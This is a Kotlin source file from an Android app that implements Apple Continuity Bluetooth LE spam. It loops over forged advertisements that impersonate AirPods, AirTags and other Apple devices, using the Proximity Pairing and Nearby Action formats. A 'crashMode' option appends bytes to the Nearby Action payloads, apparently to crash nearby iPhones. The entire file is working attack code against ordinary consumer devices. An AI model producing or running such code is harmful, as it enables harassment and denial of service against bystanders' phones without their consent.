package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class ContinuitySingleSpam(
    private val device: ContinuityDevice,
    private val crashMode: Boolean
) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val rand = Random()

    override fun start() {
        executor.execute {
            isSpamming = true
            val advertiser = BluetoothAdvertiser()
            while (isSpamming) {
                val payload = buildPayload(device, crashMode)
                val data = AdvertiseData.Builder()
                    .addManufacturerData(0x004C, payload)
                    .setIncludeTxPowerLevel(false)
                    .setIncludeDeviceName(false)
                    .build()

                advertiser.advertise(data, null)
                blinkRunnable?.run()
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (_: InterruptedException) {
                    break
                }
                advertiser.stopAdvertising()
            }
        }
    }

    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(runnable: Runnable?) {
        blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun buildPayload(device: ContinuityDevice, crashMode: Boolean): ByteArray {
        return when (device.deviceType) {
            ContinuityType.ACTION -> buildNearbyActionPayload(device.value.removePrefix("0x").uppercase(), crashMode)
            ContinuityType.DEVICE, ContinuityType.NOTYOURDEVICE -> {
                val deviceVal = device.value.removePrefix("0x").uppercase()
                val isAirTag = deviceVal == "0055" || deviceVal == "0030"
                val prefix = if (isAirTag) "05" else if (device.deviceType == ContinuityType.NOTYOURDEVICE) "01" else "07"
                val color = if (prefix == "01") "00" else "00"
                buildProximityPairPayload(prefix, deviceVal, color)
            }
        }
    }

    private fun buildProximityPairPayload(prefixHex: String, deviceIdHex: String, colorHex: String?): ByteArray {
        val buds = toHexByte((rand.nextInt(10) shl 4) + rand.nextInt(10))
        val charging = toHexByte(((rand.nextInt(8) % 8) shl 4) + (rand.nextInt(10) % 10))
        val lid = toHexByte(rand.nextInt(256))
        val color = colorHex ?: "00"

        val payloadHex = buildString {
            append("07")
            append("19")
            append(prefixHex)
            append(deviceIdHex)
            append("55")
            append(buds)
            append(charging)
            append(lid)
            append(color)
            append("00")
            append(randomHexBytes(16))
        }
        return Helper.convertHexToByteArray(payloadHex)
    }

    private fun buildNearbyActionPayload(actionHex: String, crashMode: Boolean): ByteArray {
        var flag = "C0"
        when (actionHex) {
            "21" -> flag = "40"
            "20" -> if (rand.nextBoolean()) flag = "BF"
            "09" -> if (rand.nextBoolean()) flag = "40"
        }

        val authTag = randomHexBytes(3)
        var payloadHex = "0F" + "05" + flag + actionHex + authTag
        if (crashMode) {
            payloadHex += "000010" + randomHexBytes(3)
        }
        return Helper.convertHexToByteArray(payloadHex)
    }

    private fun randomHexBytes(length: Int): String {
        val bytes = ByteArray(length)
        rand.nextBytes(bytes)
        return bytes.joinToString("") { String.format("%02X", it.toInt() and 0xFF) }
    }

    private fun toHexByte(b: Int): String = String.format("%02X", b and 0xFF)
}

